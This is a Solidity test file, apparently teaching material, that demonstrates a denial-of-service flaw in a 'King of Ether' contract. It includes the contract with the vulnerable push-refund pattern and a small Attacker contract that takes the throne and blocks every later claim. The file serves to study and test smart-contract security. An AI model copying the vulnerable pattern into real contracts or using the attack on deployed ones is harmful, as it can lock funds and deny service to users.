// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

// DOS :
// External calls can fail accidentally or deliberately, which can cause a DoS condition in the contract. For example,
// contracts that receive Ether do not contain fallback or receive functions. (DoS with unexpected revert)

contract Dos is Test {
  function testDoS() public {
    KingOfEther kingOfEther = new KingOfEther();
    address alice = vm.addr(1);
    address bob = vm.addr(2);
    address edward = vm.addr(3);
    deal(alice, 1 ether);
    deal(bob, 2 ether);
    deal(edward, 4 ether);

    vm.prank(alice);
    kingOfEther.claimThrone{value: 1 ether}();
    assertEq(kingOfEther.balance(), 1 ether);
    assertEq(kingOfEther.king(), alice);
    assertEq(alice.balance, 0);
    assertEq(address(kingOfEther).balance, 1 ether);

    vm.prank(bob);
    kingOfEther.claimThrone{value: 2 ether}();
    assertEq(kingOfEther.balance(), 2 ether);
    assertEq(kingOfEther.king(), bob);
    assertEq(alice.balance, 1 ether);// alice got 1 ether back
    assertEq(bob.balance, 0);
    assertEq(address(kingOfEther).balance, 2 ether);

    Attacker attacker = new Attacker();
    attacker.attack{value: 3 ether}(address(kingOfEther));
    assertEq(kingOfEther.balance(), 3 ether);
    assertEq(kingOfEther.king(), address(attacker));
    assertEq(bob.balance, 2 ether);// bob got 2 ethers back
    assertEq(address(kingOfEther).balance, 3 ether);

    // after attacking, claimThrone will fail, because attacker does have a receive or fallback method
    vm.prank(edward);
    vm.expectRevert("transfer ether failed");
    kingOfEther.claimThrone{value: 4 ether}();
  }
}

contract KingOfEther {
  uint256 public balance;
  address public king;

  function claimThrone() external payable {
    require(msg.value > balance, "insufficient msg.value");
    (bool success,) = king.call{value : balance}("");
    require(success, "transfer ether failed");
    balance = msg.value;
    king = msg.sender;
  }
}

contract Attacker {
  function attack(address addr) external payable {
    KingOfEther(addr).claimThrone{value : msg.value}();
  }
}
